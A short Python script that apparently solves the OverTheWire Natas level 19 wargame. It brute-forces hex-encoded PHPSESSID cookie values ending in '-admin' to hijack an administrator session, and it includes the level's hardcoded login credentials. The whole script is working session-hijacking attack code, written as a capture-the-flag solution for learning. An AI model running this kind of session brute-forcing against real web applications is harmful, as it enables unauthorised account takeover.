import requests
from string import ascii_letters, digits


url='http://natas19.natas.labs.overthewire.org/'
auth=('natas19','4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')
#<natas18-id(0-639)><-><username>
magic='2d61646d696e'
s = requests.Session()
def to_code(n):
    return ''.join(hex(ord(d))[2:] for d in str(n))

for sid in range(640):
    print(f'trying {sid}')
    s.cookies['PHPSESSID']=to_code(sid)+magic
    resp=s.post(url, auth=auth,data={"username":"admin","password":"y","submit":"submit"})
    if "regular" not in resp.text:
        print(resp.text)
        exit(0)
    s.close()
